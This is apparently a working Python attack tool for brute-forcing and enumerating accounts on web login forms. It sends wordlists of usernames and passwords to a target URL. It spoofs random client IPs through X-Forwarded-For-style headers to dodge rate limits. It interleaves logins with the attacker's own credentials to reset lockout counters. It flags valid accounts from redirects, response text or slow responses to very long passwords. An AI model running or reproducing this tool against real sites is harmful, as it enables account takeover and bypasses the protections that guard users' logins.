#!/usr/bin/python3

import argparse
import sys
import requests,re
import random
import pwn

class bcolors:
        OK = '\033[92m' #GREEN
        INFO = '\033[93m' #YELLOW
        FAIL = '\033[91m' #RED
        RESET = '\033[0m' #RESET COLOR

parser = argparse.ArgumentParser(description="COMPAH TIRA-COCO HELP MENU")
parser.add_argument("url", help="Target login URL")
parser.add_argument("-u", "--user", help="Username", required=False)
parser.add_argument("-p", "--password", help="Password (Not required)", required=False)
parser.add_argument("-U", "--users-file", help="Usernames file", required=False)
parser.add_argument("-P", "--passwords-file", help="Passwords file", required=False)
parser.add_argument("--headers", help="Enter e.g 'param:val' separated by commas", required=False)
parser.add_argument("-d", "--data", help="Data to be sent in the request 'param=val&param2=val2'", required=False)
parser.add_argument("--message", help="Message to be matched in the body", required=False)
parser.add_argument("-x", "--proxy", help="Example = http://127.0.0.1:8080", required=False)
parser.add_argument("-b", "--body", help="Show the response body", action="store_const", const=True, required=False)
parser.add_argument("-au", "--attacker-user", help="Attackers username", required=False)
parser.add_argument("-ap", "--attacker-password", help="Attackers password", required=False)
parser.add_argument("-rt", "--ratio", help="Ratio to use the attackers credentials", type=int, required=True)

if len(sys.argv) == 1:
	parser.print_help()
	sys.exit(1)
args = parser.parse_args()

if not args.user and not args.users_file:
	print(f"{bcolors.FAIL}[+] Error: At least one username or usernames file is required.{bcolors.RESET}")
	sys.exit(1)

# To randomize IP address
global min_range
global max_range
min_range = 1
max_range = 255

def gen_decoy_ip():
	octect_1 = str(random.randint(min_range,max_range))
	octect_2 = str(random.randint(min_range,max_range))
	octect_3 = str(random.randint(min_range,max_range))
	octect_4 = str(random.randint(min_range,max_range))
	dot = "."
	decoy_ip = octect_1 + dot + octect_2 + dot + octect_3 + dot + octect_4
	return decoy_ip

def gen_headers(ip,headers):
	request_headers = dict()
	default_headers = {
		'X-Forwarded-For':ip,
		'X-Originating-IP':ip,
		'X-Remote-IP':ip,
		'X-Remote-Addr':ip,
	}
	if headers:
		try:
			headers = headers.split(",")
		except:
			pass
		for i in range(len(headers)):
			header_toadd = headers[i]
			header_toadd = header_toadd.split(":")
			key,value = header_toadd
			key = key.replace(" ","")
			value = value.replace(" ","")
			request_headers[key] = value
		return request_headers | default_headers
	return default_headers

def gen_data(data,user=None,password=None):
	request_data = dict()
	if not user:
		user = "COMPAH"
	if not password:
		password = "TIRA-COCO" * 1000
	if data:
		try:
			data = data.split("&")
		except:
			pass
		for i in range(len(data)):
			data_toadd = data[i]
			data_toadd = data_toadd.split("=")
			key,value = data_toadd
			if value == "^USER^":
				value = user
			if value == "^PASS^":
				value = password
			request_data[key] = value
		return request_data
	return "test=data&default=val"

def gen_request(url,data,headers,proxy):
	requests.packages.urllib3.disable_warnings()
	response = requests.post(url,data=data,proxies={'http':proxy,'https':proxy},headers=headers,allow_redirects=False,verify=False)
	return response

def monitor(response,user,init_response,password=None):
	if args.body:
		print(response.text)
	if not password:
		password = "TIRA-COCO"
	if args.message:
		if not args.message in response.text:
			print(f"Matched: Not message in response\n\tUser: {user}\n\tPassword: {password}")
			sys.exit(0)
	if init_response.status_code != response.status_code:
		if 300 <=response.status_code <= 399:
			print(f"Matched: Status code {response.status_code} redirection\n\tUser: {user}\n\tPassword: {password}")
			sys.exit(0)
	if response.elapsed.total_seconds() > 2:
		print(f"Matched: Time elapsed {response.elapsed.total_seconds()}\n\tUser: {user}\n\tPassword: {password}")
		sys.exit(0)

def exploit_only_user(url,user,users_file,password,passwords_file,headers,data,message,proxy):
	request_headers = gen_headers(gen_decoy_ip(),headers)
	request_data = gen_data(data,user,password)
	init_response = gen_request(url,request_data,request_headers,proxy) # Response to be compared
	# Open the users wordlist
	if not user:
		with open(users_file, "r") as file:
			print(f"{bcolors.INFO}Reading the users wordlists...{bcolors.RESET}\n\n")
			for line in file:
				user = line[:-1] # Remove de newline char at the end
				request_headers = gen_headers(gen_decoy_ip(),headers) # Assembly headers
				if passwords_file:
					with open(passwords_file, "r") as p_file:
						for p_line in p_file:
							request_headers = gen_headers(gen_decoy_ip(),headers)
							password = p_line[:-1]
							request_data = gen_data(data,user,password)
							try:
								response = gen_request(url,request_data,request_headers,proxy)
								monitor(response,user,init_response,password)
							except Exception as e:
								print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
				else:
					request_data = gen_data(data,user,args.password) # Assembly data
					try:
						response = gen_request(url,request_data,request_headers,proxy)
						monitor(response,user,init_response,password)
					except Exception as e:
						print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
	else:
		if passwords_file:
			with open(passwords_file, "r") as p_file:
				for p_line in p_file:
					request_headers = gen_headers(gen_decoy_ip(),headers)
					password = p_line[:-1]
					request_data = gen_data(data,user,password)
					try:
						response = gen_request(url,request_data,request_headers,proxy)
						monitor(response,user,init_response,password)
					except Exception as e:
						print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
		else:
			request_data = gen_data(data,user,args.password) # Assembly data
			request_headers = gen_headers(gen_decoy_ip(),headers) # Assembly headers
			try:
				response = gen_request(url,request_data,request_headers,proxy)
				monitor(response,user,init_response,password)
			except Exception as e:
				print(f"{bcolors.FAIL}{e}{bcolors.RESET}")

def exploit(users,passwords):
	pass


###############################################################################################################################
###############################################################################################################################
###############################################################################################################################


pwn.log.progress(f"{bcolors.OK}Initiating...{bcolors.RESET}\n\n")

if args.users_file:
	with open(args.users_file,"r") as users_file:
		users = users_file.readlines()
		request_headers = gen_headers(gen_decoy_ip(),args.headers)
		request_data = gen_data(args.data)
		init_response = gen_request(args.url,request_data,request_headers,args.proxy)
		if args.passwords_file:
			counter = 0
			with open(args.passwords_file,"r") as passwords_file:
				passwords = passwords_file.readlines()
				for i in range(len(users)):
					while counter < len(passwords):
						for j in range(args.ratio):
							if counter < len(passwords):
								request_headers = gen_headers(gen_decoy_ip(),args.headers)
								request_data = gen_data(args.data,users[i].strip(),passwords[counter].strip())
								try:
									response = gen_request(args.url,request_data,request_headers,args.proxy)
									monitor(response,users[i].strip(),init_response,passwords[counter].strip())
								except Exception as e:
									print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
								counter += 1
						request_headers = gen_headers(gen_decoy_ip(),args.headers)
						request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
						try:
							response = gen_request(args.url,request_data,request_headers,args.proxy)
						except Exception as e:
							print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
					counter = 0
		else:
			counter = 0
			while counter <  len(users):
				for i in range(args.ratio):
					if counter < len(users):
						request_headers = gen_headers(gen_decoy_ip(),args.headers)
						request_data = gen_data(args.data,users[counter].strip(),args.password)
						try:
							response = gen_request(args.url,request_data,request_headers,args.proxy)
							monitor(response,users[counter].strip(),init_response,args.password)
						except Exception as e:
							print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
						counter += 1
				request_headers = gen_headers(gen_decoy_ip(),args.headers)
				request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
				try:
					response = gen_request(args.url,request_data,request_headers,args.proxy)
				except Exception as e:
					print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
else:
	request_headers = gen_headers(gen_decoy_ip(),args.headers)
	request_data = gen_data(args.data)
	init_response = gen_request(args.url,request_data,request_headers,args.proxy)
	if args.passwords_file:
		with open(args.passwords_file,"r") as passwords_file:
			passwords = passwords_file.readlines()
			counter = 0
			while counter < len(passwords):
				for i in range(args.ratio):
					if counter < len(passwords):
						request_headers = gen_headers(gen_decoy_ip(),args.headers)
						request_data = gen_data(args.data,args.user,passwords[counter].strip())
						try:
							response = gen_request(args.url,request_data,request_headers,args.proxy)
							monitor(response,args.user,init_response,passwords[counter].strip())
						except Exception as e:
							print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
						counter += 1
				request_headers = gen_headers(gen_decoy_ip(),args.headers)
				request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
				try:
					response = gen_request(args.url,request_data,request_headers,args.proxy)
				except Exception as e:
					print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
	else:
		request_headers = gen_headers(gen_decoy_ip(),args.headers)
		request_data = gen_data(args.data,args.user,args.password)
		try:
			response = gen_request(args.url,request_data,request_headers,args.proxy)
			monitor(response,args.user,init_response,args.password)
		except Exception as e:
			print(f"{bcolors.FAIL}{e}{bcolors.RESET}")
		if args.attacker_user and args.attacker_password:
			request_headers = gen_headers(gen_decoy_ip(),args.headers)
			request_data = gen_data(args.data,user=args.attacker_user,password=args.attacker_password)
			try:
				response = gen_request(args.url,request_data,request_headers,args.proxy)
			except Exception as e:
				print(f"{bcolors.FAIL}{e}{bcolors.RESET}")

#exploit_only_user(args.url,args.user,args.users_file,args.password,args.passwords_file,args.headers,args.data,args.message,args.proxy)
